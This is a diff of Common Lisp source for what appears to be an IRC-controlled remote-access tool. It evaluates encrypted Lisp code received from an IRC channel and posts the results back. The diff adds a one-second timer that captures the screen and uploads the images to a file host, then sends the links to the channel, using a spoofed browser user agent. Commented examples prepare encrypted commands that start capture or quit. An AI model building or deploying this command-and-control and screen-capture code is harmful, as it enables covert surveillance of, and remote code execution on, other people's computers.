@@ -231,22 +231,37 @@
         (format t "~%::COMMAND::~A::" msg)
         (format t "~%::SOURCE::~A::" src)
         (format t "~%::str::~A::" str)
-        (format t "~%::eval::~A::"
-                (handler-case (bprint (eval (read-from-string  str)))
-                  (TYPE-ERROR () (return-from irc-cmd-block nil))))
-        (finish-output)))))
+        (let ((result (handler-case (bprint (eval (read-from-string  str)))
+                        (TYPE-ERROR () (return-from irc-cmd-block nil)))))
+          (bt:with-lock-held (*irc-lock*)
+            (cl-irc:privmsg *irc-conn* *irc-chan*
+                            (format nil "=> ~A" result)))
+          (format t "~%::eval::~A::" result)
+          (finish-output))))))
 
 ;; (encrypt
 ;;  (flex:string-to-octets
 ;;   "(defun snd () (bt:with-lock-held (*irc-lock*) (cl-irc:privmsg *irc-conn* *irc-chan* (format nil \"nfo:error\"))))"
 ;;   :external-format :utf-8)
-;;  3783987858)
+;;  3783992823)
 
 ;; (encrypt
 ;;  (flex:string-to-octets
-;;   "(snd)"
+;;   ;; "(unschedule-timer *shot-timer*)"
+;;   "(schedule-timer *shot-timer* 1 :repeat-interval 1)"
 ;;   :external-format :utf-8)
-;;  3783987858)
+;;  3783995947)
+
+;; (encrypt
+;;  (flex:string-to-octets
+;;   "(progn (quit))"
+;;   :external-format :utf-8)
+;;  3783992823)
+
+;; (flex:octets-to-string
+;;  (decrypt
+;;   "62Y5gGs3D5BAEdec7Ls=" 3783992823)
+;;  :external-format :utf-8)
 
 (defun irc-msg-hook (param)
   "MUST return T for stop hooks processing"
@@ -458,7 +473,7 @@
 ;;              (format nil "~A" (gensym "FILE"))
 ;;              unpack
 ;;              :grayscale)))
-(setf drakma:*header-stream* *standard-output*)
+;; (setf drakma:*header-stream* *standard-output*)
 
 (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")
 
@@ -570,20 +585,28 @@ Content-Type: application/octet-stream
          (link       (if (cdr (assoc :status upload-ret))
                          (subseq (cdadr (cadadr (assoc :data upload-ret))) 20)
                          nil))
-         (full-filename (format nil "FILE_~A_~A"
-                                *irc-sess*
-                                filename)))
-    (finish-output)
-    (with-open-file (file-stream full-filename
-                                 :direction :output
-                                 :if-exists :supersede
-                                 :if-does-not-exist :create
-                                 :element-type '(unsigned-byte 8))
-      (write-sequence decoded file-stream)
-      (cl-irc:privmsg *irc-conn* *irc-chan*
-                      (if link
-                          link
-                          upload-ret)))))
+         ;; (full-filename (format nil "FILE_~A_~A"
+         ;;                        *irc-sess*
+         ;;                        filename))
+         )
+    (cl-irc:privmsg *irc-conn* *irc-chan*
+                    (if link
+                        link
+                        upload-ret))
+    ;; (with-open-file (file-stream full-filename
+    ;;                              :direction :output
+    ;;                              :if-exists :supersede
+    ;;                              :if-does-not-exist :create
+    ;;                              :element-type '(unsigned-byte 8))
+    ;;   (write-sequence decoded file-stream))
+    ))
+
+(defparameter *shot-timer*
+  (make-timer #'(lambda ()
+                  (shot))
+              :name "shot" :thread t))
+
+;; (defparameter *stop* nil)
 
 (let ((prev)
       (cnt 9999))
@@ -608,9 +631,6 @@ Content-Type: application/octet-stream
                               (aref snap qy qx)))))
             (save (format nil "~~A_~A" cnt) dims xored)
             (setf prev snap)
-            (incf cnt))))
-    (sleep 1)
-    ;; (shot)
-    ))
+            (incf cnt))))))
 
-(shot)
+(schedule-timer *shot-timer* 1 :repeat-interval 1)
